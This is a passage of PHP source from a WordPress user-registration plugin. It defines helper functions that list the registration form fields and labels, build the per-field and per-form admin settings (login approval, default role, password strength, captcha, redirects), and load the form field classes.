| [640](#L640) | } |
| [641](#L641) |  |
| [642](#L642) | /\*\* |
| [643](#L643) | \* All default fields storing in usermeta table |
| [644](#L644) | \* |
| [645](#L645) | \* @return mixed|array |
| [646](#L646) | \*/ |
| [647](#L647) | function ur\_get\_registered\_user\_meta\_fields() { |
| [648](#L648) | return apply\_filters( |
| [649](#L649) | 'user\_registration\_registered\_user\_meta\_fields', |
| [650](#L650) | array( |
| [651](#L651) | 'nickname', |
| [652](#L652) | 'first\_name', |
| [653](#L653) | 'last\_name', |
| [654](#L654) | 'description', |
| [655](#L655) | ) |
| [656](#L656) | ); |
| [657](#L657) | } |
| [658](#L658) |  |
| [659](#L659) | /\*\* |
| [660](#L660) | \* All registered form fields |
| [661](#L661) | \* |
| [662](#L662) | \* @return mixed|array |
| [663](#L663) | \*/ |
| [664](#L664) | function ur\_get\_registered\_form\_fields() { |
| [665](#L665) | return apply\_filters( |
| [666](#L666) | 'user\_registration\_registered\_form\_fields', |
| [667](#L667) | array( |
| [668](#L668) | 'user\_email', |
| [669](#L669) | 'user\_confirm\_email', |
| [670](#L670) | 'user\_pass', |
| [671](#L671) | 'user\_confirm\_password', |
| [672](#L672) | 'user\_login', |
| [673](#L673) | 'nickname', |
| [674](#L674) | 'first\_name', |
| [675](#L675) | 'last\_name', |
| [676](#L676) | 'user\_url', |
| [677](#L677) | 'display\_name', |
| [678](#L678) | 'description', |
| [679](#L679) | 'text', |
| [680](#L680) | 'password', |
| [681](#L681) | 'email', |
| [682](#L682) | 'select', |
| [683](#L683) | 'country', |
| [684](#L684) | 'textarea', |
| [685](#L685) | 'number', |
| [686](#L686) | 'date', |
| [687](#L687) | 'checkbox', |
| [688](#L688) | 'privacy\_policy', |
| [689](#L689) | 'radio', |
| [690](#L690) | ) |
| [691](#L691) | ); |
| [692](#L692) | } |
| [693](#L693) |  |
| [694](#L694) | /\*\* |
| [695](#L695) | \* All registered form fields with default labels |
| [696](#L696) | \* |
| [697](#L697) | \* @return mixed|array |
| [698](#L698) | \*/ |
| [699](#L699) | function ur\_get\_registered\_form\_fields\_with\_default\_labels() { |
| [700](#L700) | return apply\_filters( |
| [701](#L701) | 'user\_registration\_registered\_form\_fields\_with\_default\_labels', |
| [702](#L702) | array( |
| [703](#L703) | 'user\_email'            => \_\_( 'User Email', 'user-registration' ), |
| [704](#L704) | 'user\_confirm\_email'    => \_\_( 'User Confirm Email', 'user-registration' ), |
| [705](#L705) | 'user\_pass'             => \_\_( 'User Pass', 'user-registration' ), |
| [706](#L706) | 'user\_confirm\_password' => \_\_( 'User Confirm Password', 'user-registration' ), |
| [707](#L707) | 'user\_login'            => \_\_( 'User Login', 'user-registration' ), |
| [708](#L708) | 'nickname'              => \_\_( 'Nickname', 'user-registration' ), |
| [709](#L709) | 'first\_name'            => \_\_( 'First Name', 'user-registration' ), |
| [710](#L710) | 'last\_name'             => \_\_( 'Last Name', 'user-registration' ), |
| [711](#L711) | 'user\_url'              => \_\_( 'User URL', 'user-registration' ), |
| [712](#L712) | 'display\_name'          => \_\_( 'Display Name', 'user-registration' ), |
| [713](#L713) | 'description'           => \_\_( 'Description', 'user-registration' ), |
| [714](#L714) | 'text'                  => \_\_( 'Text', 'user-registration' ), |
| [715](#L715) | 'password'              => \_\_( 'Password', 'user-registration' ), |
| [716](#L716) | 'email'                 => \_\_( 'Secondary Email', 'user-registration' ), |
| [717](#L717) | 'select'                => \_\_( 'Select', 'user-registration' ), |
| [718](#L718) | 'country'               => \_\_( 'Country', 'user-registration' ), |
| [719](#L719) | 'textarea'              => \_\_( 'Textarea', 'user-registration' ), |
| [720](#L720) | 'number'                => \_\_( 'Number', 'user-registration' ), |
| [721](#L721) | 'date'                  => \_\_( 'Date', 'user-registration' ), |
| [722](#L722) | 'checkbox'              => \_\_( 'Checkbox', 'user-registration' ), |
| [723](#L723) | 'privacy\_policy'        => \_\_( 'Privacy Policy', 'user-registration' ), |
| [724](#L724) | 'radio'                 => \_\_( 'Radio', 'user-registration' ), |
| [725](#L725) | 'hidden'                => \_\_( 'Hidden', 'user-registration' ), |
| [726](#L726) | ) |
| [727](#L727) | ); |
| [728](#L728) | } |
| [729](#L729) |  |
| [730](#L730) | /\*\* |
| [731](#L731) | \* General settings for each fields |
| [732](#L732) | \* |
| [733](#L733) | \* @param string $id id for each field. |
| [734](#L734) | \* @return mixed|array |
| [735](#L735) | \*/ |
| [736](#L736) | function ur\_get\_general\_settings( $id ) { |
| [737](#L737) |  |
| [738](#L738) | $general\_settings = array( |
| [739](#L739) | 'label'       => array( |
| [740](#L740) | 'setting\_id'  => 'label', |
| [741](#L741) | 'type'        => 'text', |
| [742](#L742) | 'label'       => \_\_( 'Label', 'user-registration' ), |
| [743](#L743) | 'name'        => 'ur\_general\_setting[label]', |
| [744](#L744) | 'placeholder' => \_\_( 'Label', 'user-registration' ), |
| [745](#L745) | 'required'    => true, |
| [746](#L746) | 'tip'         => \_\_( 'Enter text for the form field label. This is recommended and can be hidden in the Advanced Settings.', 'user-registration' ), |
| [747](#L747) | ), |
| [748](#L748) | 'description' => array( |
| [749](#L749) | 'setting\_id'  => 'description', |
| [750](#L750) | 'type'        => 'textarea', |
| [751](#L751) | 'label'       => \_\_( 'Description', 'user-registration' ), |
| [752](#L752) | 'name'        => 'ur\_general\_setting[description]', |
| [753](#L753) | 'placeholder' => \_\_( 'Description', 'user-registration' ), |
| [754](#L754) | 'required'    => true, |
| [755](#L755) | 'tip'         => \_\_( 'Enter text for the form field description.', 'user-registration' ), |
| [756](#L756) | ), |
| [757](#L757) | 'field\_name'  => array( |
| [758](#L758) | 'setting\_id'  => 'field-name', |
| [759](#L759) | 'type'        => 'text', |
| [760](#L760) | 'label'       => \_\_( 'Field Name', 'user-registration' ), |
| [761](#L761) | 'name'        => 'ur\_general\_setting[field\_name]', |
| [762](#L762) | 'placeholder' => \_\_( 'Field Name', 'user-registration' ), |
| [763](#L763) | 'required'    => true, |
| [764](#L764) | 'tip'         => \_\_( 'Unique key for the field.', 'user-registration' ), |
| [765](#L765) | ), |
| [766](#L766) |  |
| [767](#L767) | 'placeholder' => array( |
| [768](#L768) | 'setting\_id'  => 'placeholder', |
| [769](#L769) | 'type'        => 'text', |
| [770](#L770) | 'label'       => \_\_( 'Placeholder', 'user-registration' ), |
| [771](#L771) | 'name'        => 'ur\_general\_setting[placeholder]', |
| [772](#L772) | 'placeholder' => \_\_( 'Placeholder', 'user-registration' ), |
| [773](#L773) | 'required'    => true, |
| [774](#L774) | 'tip'         => \_\_( 'Enter placeholder for the field.', 'user-registration' ), |
| [775](#L775) | ), |
| [776](#L776) | 'required'    => array( |
| [777](#L777) | 'setting\_id'  => 'required', |
| [778](#L778) | 'type'        => 'toggle', |
| [779](#L779) | 'label'       => \_\_( 'Required', 'user-registration' ), |
| [780](#L780) | 'name'        => 'ur\_general\_setting[required]', |
| [781](#L781) | 'placeholder' => '', |
| [782](#L782) | 'required'    => true, |
| [783](#L783) | 'default'     => 'false', |
| [784](#L784) | 'tip'         => \_\_( 'Check this option to mark the field required. A form will not submit unless all required fields are provided.', 'user-registration' ), |
| [785](#L785) | ), |
| [786](#L786) | 'hide\_label'  => array( |
| [787](#L787) | 'setting\_id'  => 'hide-label', |
| [788](#L788) | 'type'        => 'toggle', |
| [789](#L789) | 'label'       => \_\_( 'Hide Label', 'user-registration' ), |
| [790](#L790) | 'name'        => 'ur\_general\_setting[hide\_label]', |
| [791](#L791) | 'placeholder' => '', |
| [792](#L792) | 'required'    => true, |
| [793](#L793) | 'default'     => 'false', |
| [794](#L794) | 'tip'         => \_\_( 'Check this option to hide the label of this field.', 'user-registration' ), |
| [795](#L795) | ), |
| [796](#L796) | ); |
| [797](#L797) |  |
| [798](#L798) | $exclude\_placeholder = apply\_filters( |
| [799](#L799) | 'user\_registration\_exclude\_placeholder', |
| [800](#L800) | array( |
| [801](#L801) | 'checkbox', |
| [802](#L802) | 'privacy\_policy', |
| [803](#L803) | 'radio', |
| [804](#L804) | 'file', |
| [805](#L805) | 'mailchimp', |
| [806](#L806) | 'hidden', |
| [807](#L807) | ) |
| [808](#L808) | ); |
| [809](#L809) | $strip\_id            = str\_replace( 'user\_registration\_', '', $id ); |
| [810](#L810) |  |
| [811](#L811) | if ( in\_array( $strip\_id, $exclude\_placeholder, true ) ) { |
| [812](#L812) | unset( $general\_settings['placeholder'] ); |
| [813](#L813) | } |
| [814](#L814) |  |
| [815](#L815) | $choices\_fields = array( 'radio', 'select', 'checkbox' ); |
| [816](#L816) |  |
| [817](#L817) | if ( in\_array( $strip\_id, $choices\_fields, true ) ) { |
| [818](#L818) |  |
| [819](#L819) | $settings['options'] = array( |
| [820](#L820) | 'setting\_id'  => 'options', |
| [821](#L821) | 'type'        => 'checkbox' === $strip\_id ? 'checkbox' : 'radio', |
| [822](#L822) | 'label'       => \_\_( 'Options', 'user-registration' ), |
| [823](#L823) | 'name'        => 'ur\_general\_setting[options]', |
| [824](#L824) | 'placeholder' => '', |
| [825](#L825) | 'required'    => true, |
| [826](#L826) | 'options'     => array( |
| [827](#L827) | \_\_( 'First Choice', 'user-registration' ), |
| [828](#L828) | \_\_( 'Second Choice', 'user-registration' ), |
| [829](#L829) | \_\_( 'Third Choice', 'user-registration' ), |
| [830](#L830) | ), |
| [831](#L831) | ); |
| [832](#L832) |  |
| [833](#L833) | $general\_settings = ur\_insert\_after\_helper( $general\_settings, $settings, 'field\_name' ); |
| [834](#L834) | } |
| [835](#L835) | if ( 'privacy\_policy' === $strip\_id || 'user\_confirm\_email' === $strip\_id || 'user\_confirm\_password' === $strip\_id || in\_array( $strip\_id, ur\_get\_required\_fields() ) ) { |
| [836](#L836) | $general\_settings['required'] = array( |
| [837](#L837) | 'setting\_id'  => '', |
| [838](#L838) | 'type'        => 'hidden', |
| [839](#L839) | 'label'       => '', |
| [840](#L840) | 'name'        => 'ur\_general\_setting[required]', |
| [841](#L841) | 'placeholder' => '', |
| [842](#L842) | 'default'     => true, |
| [843](#L843) | 'required'    => true, |
| [844](#L844) | ); |
| [845](#L845) | } |
| [846](#L846) |  |
| [847](#L847) | return apply\_filters( 'user\_registration\_field\_options\_general\_settings', $general\_settings, $id ); |
| [848](#L848) | } |
| [849](#L849) |  |
| [850](#L850) | /\*\* |
| [851](#L851) | \* Insert in between the indexes in multidimensional array. |
| [852](#L852) | \* |
| [853](#L853) | \* @since  1.5.7 |
| [854](#L854) | \* @param  array  $items      An array of items. |
| [855](#L855) | \* @param  array  $new\_items  New items to insert inbetween. |
| [856](#L856) | \* @param  string $after      Index to insert after. |
| [857](#L857) | \* |
| [858](#L858) | \* @return array              Ordered array of items. |
| [859](#L859) | \*/ |
| [860](#L860) | function ur\_insert\_after\_helper( $items, $new\_items, $after ) { |
| [861](#L861) |  |
| [862](#L862) | // Search for the item position and +1 since is after the selected item key. |
| [863](#L863) | $position = array\_search( $after, array\_keys( $items ), true ) + 1; |
| [864](#L864) |  |
| [865](#L865) | // Insert the new item. |
| [866](#L866) | $return\_items  = array\_slice( $items, 0, $position, true ); |
| [867](#L867) | $return\_items += $new\_items; |
| [868](#L868) | $return\_items += array\_slice( $items, $position, count( $items ) - $position, true ); |
| [869](#L869) |  |
| [870](#L870) | return $return\_items; |
| [871](#L871) | } |
| [872](#L872) |  |
| [873](#L873) | /\*\* |
| [874](#L874) | \* Load form field class. |
| [875](#L875) | \* |
| [876](#L876) | \* @param string $class\_key Class Key. |
| [877](#L877) | \*/ |
| [878](#L878) | function ur\_load\_form\_field\_class( $class\_key ) { |
| [879](#L879) | $exploded\_class = explode( '\_', $class\_key ); |
| [880](#L880) | $class\_path     = UR\_FORM\_PATH . 'class-ur-' . join( '-', array\_map( 'strtolower', $exploded\_class ) ) . '.php'; |
| [881](#L881) | $class\_name     = 'UR\_Form\_Field\_' . join( '\_', array\_map( 'ucwords', $exploded\_class ) ); |
| [882](#L882) | $class\_path     = apply\_filters( 'user\_registration\_form\_field\_' . $class\_key . '\_path', $class\_path ); |
| [883](#L883) | /\* Backward Compat since 1.4.0 \*/ |
| [884](#L884) | if ( file\_exists( $class\_path ) ) { |
| [885](#L885) | $class\_name = 'UR\_' . join( '\_', array\_map( 'ucwords', $exploded\_class ) ); |
| [886](#L886) | if ( ! class\_exists( $class\_name ) ) { |
| [887](#L887) | include\_once $class\_path; |
| [888](#L888) | } |
| [889](#L889) | } |
| [890](#L890) | /\* Backward compat end\*/ |
| [891](#L891) | return $class\_name; |
| [892](#L892) | } |
| [893](#L893) |  |
| [894](#L894) | /\*\* |
| [895](#L895) | \* List of all roles |
| [896](#L896) | \* |
| [897](#L897) | \* @return array $all\_roles |
| [898](#L898) | \*/ |
| [899](#L899) | function ur\_get\_default\_admin\_roles() { |
| [900](#L900) | global $wp\_roles; |
| [901](#L901) |  |
| [902](#L902) | if ( ! class\_exists( 'WP\_Roles' ) ) { |
| [903](#L903) | return; |
| [904](#L904) | } |
| [905](#L905) |  |
| [906](#L906) | if ( ! isset( $wp\_roles ) ) { |
| [907](#L907) | $wp\_roles = new WP\_Roles(); // @codingStandardsIgnoreLine |
| [908](#L908) | } |
| [909](#L909) |  |
| [910](#L910) | $roles     = isset( $wp\_roles->roles ) ? $wp\_roles->roles : array(); |
| [911](#L911) | $all\_roles = array(); |
| [912](#L912) |  |
| [913](#L913) | foreach ( $roles as $role\_key => $role ) { |
| [914](#L914) | $all\_roles[ $role\_key ] = $role['name']; |
| [915](#L915) | } |
| [916](#L916) |  |
| [917](#L917) | return apply\_filters( 'user\_registration\_user\_default\_roles', $all\_roles ); |
| [918](#L918) | } |
| [919](#L919) |  |
| [920](#L920) |  |
| [921](#L921) | /\*\* |
| [922](#L922) | \* Random number generated by time() |
| [923](#L923) | \* |
| [924](#L924) | \* @return int |
| [925](#L925) | \*/ |
| [926](#L926) | function ur\_get\_random\_number() { |
| [927](#L927) | return time(); |
| [928](#L928) | } |
| [929](#L929) |  |
| [930](#L930) | /\*\* |
| [931](#L931) | \* General Form settings |
| [932](#L932) | \* |
| [933](#L933) | \* @param int $form\_id  Form ID. |
| [934](#L934) | \* |
| [935](#L935) | \* @since 1.0.1 |
| [936](#L936) | \* |
| [937](#L937) | \* @return array Form settings. |
| [938](#L938) | \*/ |
| [939](#L939) | function ur\_admin\_form\_settings\_fields( $form\_id ) { |
| [940](#L940) |  |
| [941](#L941) | $all\_roles = ur\_get\_default\_admin\_roles(); |
| [942](#L942) |  |
| [943](#L943) | $arguments = array( |
| [944](#L944) | 'form\_id'      => $form\_id, |
| [945](#L945) |  |
| [946](#L946) | 'setting\_data' => array( |
| [947](#L947) | array( |
| [948](#L948) | 'label'             => \_\_( 'User Approval And Login Option', 'user-registration' ), |
| [949](#L949) | 'description'       => \_\_( 'This option lets you choose login option after user registration.', 'user-registration' ), |
| [950](#L950) | 'id'                => 'user\_registration\_form\_setting\_login\_options', |
| [951](#L951) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_login\_options', get\_option( 'user\_registration\_general\_setting\_login\_options' ) ), |
| [952](#L952) | 'type'              => 'select', |
| [953](#L953) | 'class'             => array( 'ur-enhanced-select' ), |
| [954](#L954) | 'custom\_attributes' => array(), |
| [955](#L955) | 'input\_class'       => array(), |
| [956](#L956) | 'required'          => false, |
| [957](#L957) | 'options'           => ur\_login\_option(), |
| [958](#L958) | 'tip'               => \_\_( 'Login method that should be used by the users registered through this form.', 'user-registration' ), |
| [959](#L959) | ), |
| [960](#L960) | array( |
| [961](#L961) | 'label'       => \_\_( 'Send User Approval Link in Email', 'user-registration' ), |
| [962](#L962) | 'description' => '', |
| [963](#L963) | 'id'          => 'user\_registration\_form\_setting\_enable\_email\_approval', |
| [964](#L964) | 'type'        => 'toggle', |
| [965](#L965) | 'tip'         => \_\_( 'Check to receive a link with token in email to approve the users directly.', 'user-registration' ), |
| [966](#L966) | 'css'         => 'min-width: 350px;', |
| [967](#L967) | 'default'     => ur\_get\_approval\_default( $form\_id ), |
| [968](#L968) | ), |
| [969](#L969) | array( |
| [970](#L970) | 'type'              => 'select', |
| [971](#L971) | 'label'             => \_\_( 'Default User Role', 'user-registration' ), |
| [972](#L972) | 'description'       => '', |
| [973](#L973) | 'required'          => false, |
| [974](#L974) | 'id'                => 'user\_registration\_form\_setting\_default\_user\_role', |
| [975](#L975) | 'class'             => array( 'ur-enhanced-select' ), |
| [976](#L976) | 'input\_class'       => array(), |
| [977](#L977) | 'options'           => $all\_roles, |
| [978](#L978) | 'custom\_attributes' => array(), |
| [979](#L979) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_default\_user\_role', get\_option( 'user\_registration\_form\_setting\_default\_user\_role', 'subscriber' ) ), |
| [980](#L980) | 'tip'               => \_\_( 'Default role for the users registered through this form.', 'user-registration' ), |
| [981](#L981) | ), |
| [982](#L982) | array( |
| [983](#L983) | 'type'              => 'toggle', |
| [984](#L984) | 'label'             => \_\_( 'Enable Strong Password', 'user-registration' ), |
| [985](#L985) | 'description'       => '', |
| [986](#L986) | 'required'          => false, |
| [987](#L987) | 'id'                => 'user\_registration\_form\_setting\_enable\_strong\_password', |
| [988](#L988) | 'class'             => array( 'ur-enhanced-select' ), |
| [989](#L989) | 'input\_class'       => array(), |
| [990](#L990) | 'custom\_attributes' => array(), |
| [991](#L991) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_enable\_strong\_password', ur\_string\_to\_bool( get\_option( 'user\_registration\_form\_setting\_enable\_strong\_password', 1 ) ) ), |
| [992](#L992) | 'tip'               => \_\_( 'Make strong password compulsary.', 'user-registration' ), |
| [993](#L993) | ), |
| [994](#L994) | array( |
| [995](#L995) | 'type'              => 'radio-group', |
| [996](#L996) | 'label'             => \_\_( 'Minimum Password Strength', 'user-registration' ), |
| [997](#L997) | 'description'       => '', |
| [998](#L998) | 'required'          => false, |
| [999](#L999) | 'id'                => 'user\_registration\_form\_setting\_minimum\_password\_strength', |
| [1000](#L1000) | 'class'             => array( 'ur-enhanced-select' ), |
| [1001](#L1001) | 'input\_class'       => array(), |
| [1002](#L1002) | 'options'           => array( |
| [1003](#L1003) | '0' => \_\_( 'Very Weak', 'user-registration' ), |
| [1004](#L1004) | '1' => \_\_( 'Weak', 'user-registration' ), |
| [1005](#L1005) | '2' => \_\_( 'Medium', 'user-registration' ), |
| [1006](#L1006) | '3' => \_\_( 'Strong', 'user-registration' ), |
| [1007](#L1007) | ), |
| [1008](#L1008) | 'custom\_attributes' => array(), |
| [1009](#L1009) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_minimum\_password\_strength', get\_option( 'user\_registration\_form\_setting\_minimum\_password\_strength', '3' ) ), |
| [1010](#L1010) | 'tip'               => \_\_( 'Set minimum required password strength.', 'user-registration' ), |
| [1011](#L1011) | ), |
| [1012](#L1012) | array( |
| [1013](#L1013) | 'type'              => 'text', |
| [1014](#L1014) | 'label'             => \_\_( 'Submit Button Class', 'user-registration' ), |
| [1015](#L1015) | 'description'       => '', |
| [1016](#L1016) | 'required'          => false, |
| [1017](#L1017) | 'id'                => 'user\_registration\_form\_setting\_form\_submit\_class', |
| [1018](#L1018) | 'class'             => array( 'ur-enhanced-select' ), |
| [1019](#L1019) | 'input\_class'       => array(), |
| [1020](#L1020) | 'custom\_attributes' => array(), |
| [1021](#L1021) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_form\_submit\_class', '' ), |
| [1022](#L1022) | 'tip'               => \_\_( 'Enter CSS class names for the Submit Button. Multiple class names should be separated with spaces.', 'user-registration' ), |
| [1023](#L1023) | ), |
| [1024](#L1024) | array( |
| [1025](#L1025) | 'type'              => 'text', |
| [1026](#L1026) | 'label'             => \_\_( 'Submit Button Text', 'user-registration' ), |
| [1027](#L1027) | 'description'       => '', |
| [1028](#L1028) | 'required'          => false, |
| [1029](#L1029) | 'id'                => 'user\_registration\_form\_setting\_form\_submit\_label', |
| [1030](#L1030) | 'class'             => array( 'ur-enhanced-select' ), |
| [1031](#L1031) | 'input\_class'       => array(), |
| [1032](#L1032) | 'custom\_attributes' => array(), |
| [1033](#L1033) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_form\_submit\_label', 'Submit' ), |
| [1034](#L1034) | 'tip'               => \_\_( 'Enter desired text for the Submit Button.', 'user-registration' ), |
| [1035](#L1035) | ), |
| [1036](#L1036) | array( |
| [1037](#L1037) | 'type'              => 'select', |
| [1038](#L1038) | 'label'             => \_\_( 'Success message position', 'user-registration' ), |
| [1039](#L1039) | 'description'       => '', |
| [1040](#L1040) | 'required'          => false, |
| [1041](#L1041) | 'id'                => 'user\_registration\_form\_setting\_success\_message\_position', |
| [1042](#L1042) | 'class'             => array( 'ur-enhanced-select' ), |
| [1043](#L1043) | 'input\_class'       => array(), |
| [1044](#L1044) | 'options'           => array( |
| [1045](#L1045) | '0' => \_\_( 'Top', 'user-registration' ), |
| [1046](#L1046) | '1' => \_\_( 'Bottom', 'user-registration' ), |
| [1047](#L1047) | ), |
| [1048](#L1048) | 'custom\_attributes' => array(), |
| [1049](#L1049) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_success\_message\_position', '1' ), |
| [1050](#L1050) | 'tip'               => \_\_( 'Display success message either at the top or bottom after successful registration.', 'user-registration' ), |
| [1051](#L1051) | ), |
| [1052](#L1052) | array( |
| [1053](#L1053) | 'type'              => 'toggle', |
| [1054](#L1054) |  |
| [1055](#L1055) | /\* translators: 1: Link tag open 2:: Link content 3:: Link tag close \*/ |
| [1056](#L1056) | 'label'             => sprintf( \_\_( 'Enable &nbsp; %1$s %2$s Captcha %3$s &nbsp; Support', 'user-registration' ), '<a title="', 'Please make sure the site key and secret are not empty in setting page." href="' . admin\_url() . 'admin.php?page=user-registration-settings&tab=captcha" target="\_blank">', '</a>' ), |
| [1057](#L1057) | 'description'       => '', |
| [1058](#L1058) | 'required'          => false, |
| [1059](#L1059) | 'id'                => 'user\_registration\_form\_setting\_enable\_recaptcha\_support', |
| [1060](#L1060) | 'class'             => array( 'ur-enhanced-select' ), |
| [1061](#L1061) | 'input\_class'       => array(), |
| [1062](#L1062) | 'custom\_attributes' => array(), |
| [1063](#L1063) | 'default'           => ur\_string\_to\_bool( ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_enable\_recaptcha\_support', false ) ), |
| [1064](#L1064) | 'tip'               => \_\_( 'Enable Captcha for strong security from spams and bots.', 'user-registration' ), |
| [1065](#L1065) | ), |
| [1066](#L1066) | array( |
| [1067](#L1067) | 'type'              => 'select', |
| [1068](#L1068) | 'label'             => \_\_( 'Form Template', 'user-registration' ), |
| [1069](#L1069) | 'description'       => '', |
| [1070](#L1070) | 'required'          => false, |
| [1071](#L1071) | 'id'                => 'user\_registration\_form\_template', |
| [1072](#L1072) | 'class'             => array( 'ur-enhanced-select' ), |
| [1073](#L1073) | 'input\_class'       => array(), |
| [1074](#L1074) | 'options'           => array( |
| [1075](#L1075) | 'Default'      => \_\_( 'Default', 'user-registration' ), |
| [1076](#L1076) | 'Bordered'     => \_\_( 'Bordered', 'user-registration' ), |
| [1077](#L1077) | 'Flat'         => \_\_( 'Flat', 'user-registration' ), |
| [1078](#L1078) | 'Rounded'      => \_\_( 'Rounded', 'user-registration' ), |
| [1079](#L1079) | 'Rounded Edge' => \_\_( 'Rounded Edge', 'user-registration' ), |
| [1080](#L1080) | ), |
| [1081](#L1081) | 'custom\_attributes' => array(), |
| [1082](#L1082) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_template', ucwords( str\_replace( '\_', ' ', get\_option( 'user\_registration\_form\_template', 'default' ) ) ) ), |
| [1083](#L1083) | 'tip'               => \_\_( 'Choose form template to use.', 'user-registration' ), |
| [1084](#L1084) | ), |
| [1085](#L1085) | array( |
| [1086](#L1086) | 'type'              => 'text', |
| [1087](#L1087) | 'label'             => \_\_( 'Form Class', 'user-registration' ), |
| [1088](#L1088) | 'description'       => '', |
| [1089](#L1089) | 'required'          => false, |
| [1090](#L1090) | 'id'                => 'user\_registration\_form\_custom\_class', |
| [1091](#L1091) | 'class'             => array( 'ur-enhanced-select' ), |
| [1092](#L1092) | 'input\_class'       => array(), |
| [1093](#L1093) | 'custom\_attributes' => array(), |
| [1094](#L1094) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_custom\_class' ), |
| [1095](#L1095) | 'tip'               => \_\_( 'Enter CSS class names for the Form Wrapper. Multiple class names should be separated with spaces.', 'user-registration' ), |
| [1096](#L1096) | ), |
| [1097](#L1097) | array( |
| [1098](#L1098) | 'type'              => 'select', |
| [1099](#L1099) | 'label'             => \_\_( 'Redirect After Registration', 'user-registration' ), |
| [1100](#L1100) | 'description'       => '', |
| [1101](#L1101) | 'required'          => false, |
| [1102](#L1102) | 'id'                => 'user\_registration\_form\_setting\_redirect\_after\_registration', |
| [1103](#L1103) | 'class'             => array( 'ur-enhanced-select' ), |
| [1104](#L1104) | 'input\_class'       => array(), |
| [1105](#L1105) | 'options'           => apply\_filters( |
| [1106](#L1106) | 'user\_registration\_redirect\_after\_registration\_options', |
| [1107](#L1107) | array( |
| [1108](#L1108) | 'no-redirection' => \_\_( 'No Redirection', 'user-registration' ), |
| [1109](#L1109) | 'internal-page'  => \_\_( 'Internal Page', 'user-registration' ), |
| [1110](#L1110) | 'external-url'   => \_\_( 'External URL', 'user-registration' ), |
| [1111](#L1111) | ) |
| [1112](#L1112) | ), |
| [1113](#L1113) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_redirect\_after\_registration', 'no-redirection' ), |
| [1114](#L1114) | 'tip'               => \_\_( 'Choose where to redirect the user after successful registration.', 'user-registration' ), |
| [1115](#L1115) | 'custom\_attributes' => array(), |
| [1116](#L1116) | ), |
| [1117](#L1117) | array( |
| [1118](#L1118) | 'type'              => 'select', |
| [1119](#L1119) | 'label'             => \_\_( 'Custom Page', 'user-registration' ), |
| [1120](#L1120) | 'description'       => '', |
| [1121](#L1121) | 'required'          => false, |
| [1122](#L1122) | 'id'                => 'user\_registration\_form\_setting\_redirect\_page', |
| [1123](#L1123) | 'class'             => array( 'ur-enhanced-select' ), |
| [1124](#L1124) | 'input\_class'       => array(), |
| [1125](#L1125) | 'options'           => ur\_get\_all\_pages(), |
| [1126](#L1126) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_redirect\_page', '' ), |
| [1127](#L1127) | 'tip'               => \_\_( 'Choose the custom page to redirect after registration', 'user-registration' ), |
| [1128](#L1128) | 'custom\_attributes' => array(), |
| [1129](#L1129) | ), |
| [1130](#L1130) | array( |
| [1131](#L1131) | 'type'              => 'text', |
| [1132](#L1132) | 'label'             => \_\_( 'Redirect URL', 'user-registration' ), |
| [1133](#L1133) | 'id'                => 'user\_registration\_form\_setting\_redirect\_options', |
| [1134](#L1134) | 'class'             => array( 'ur-enhanced-select' ), |
| [1135](#L1135) | 'input\_class'       => array(), |
| [1136](#L1136) | 'custom\_attributes' => array(), |
| [1137](#L1137) | 'default'           => ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_redirect\_options', get\_option( 'user\_registration\_general\_setting\_redirect\_options', '' ) ),  // Getting redirect options from global settings for backward compatibility. |
| [1138](#L1138) | 'tip'               => \_\_( 'This option lets you enter redirect path after successful user registration.', 'user-registration' ), |
| [1139](#L1139) | ), |
| [1140](#L1140) | ), |
| [1141](#L1141) | ); |
| [1142](#L1142) |  |
| [1143](#L1143) | $arguments = apply\_filters( 'user\_registration\_get\_form\_settings', $arguments ); |
| [1144](#L1144) |  |
| [1145](#L1145) | return $arguments['setting\_data']; |
| [1146](#L1146) | } |
| [1147](#L1147) |  |
| [1148](#L1148) | /\*\* |
| [1149](#L1149) | \* User Login Option |
| [1150](#L1150) | \* |
| [1151](#L1151) | \* @return array |
| [1152](#L1152) | \*/ |
| [1153](#L1153) | function ur\_login\_option() { |
| [1154](#L1154) |  |
| [1155](#L1155) | return apply\_filters( |
| [1156](#L1156) | 'user\_registration\_login\_options', |
| [1157](#L1157) | array( |
| [1158](#L1158) | 'default'            => \_\_( 'Auto approval and manual login', 'user-registration' ), |
| [1159](#L1159) | 'auto\_login'         => \_\_( 'Auto approval and auto login ', 'user-registration' ), |
| [1160](#L1160) | 'admin\_approval'     => \_\_( 'Admin approval', 'user-registration' ), |
| [1161](#L1161) | 'email\_confirmation' => \_\_( 'Auto approval after email confirmation', 'user-registration' ), |
| [1162](#L1162) | ) |
| [1163](#L1163) | ); |
| [1164](#L1164) | } |
| [1165](#L1165) |  |
| [1166](#L1166) | /\*\* |
| [1167](#L1167) | \* User Login Option |
| [1168](#L1168) | \* |
| [1169](#L1169) | \* @return array |
| [1170](#L1170) | \*/ |
| [1171](#L1171) | function ur\_login\_option\_with() { |
| [1172](#L1172) |  |
| [1173](#L1173) | return apply\_filters( |
| [1174](#L1174) | 'user\_registration\_login\_options\_with', |
| [1175](#L1175) | array( |
| [1176](#L1176) | 'default'  => \_\_( 'Username or Email', 'user-registration' ), |
| [1177](#L1177) | 'username' => \_\_( 'Username', 'user-registration' ), |
| [1178](#L1178) | 'email'    => \_\_( 'Email', 'user-registration' ), |
| [1179](#L1179) | ) |
| [1180](#L1180) | ); |
| [1181](#L1181) | } |
| [1182](#L1182) |  |
| [1183](#L1183) | /\*\* |
| [1184](#L1184) | \* Get Default value for Enable Email Approval Checkbox |
| [1185](#L1185) | \* |
| [1186](#L1186) | \* @param int $form\_id Form ID. |
| [1187](#L1187) | \*/ |
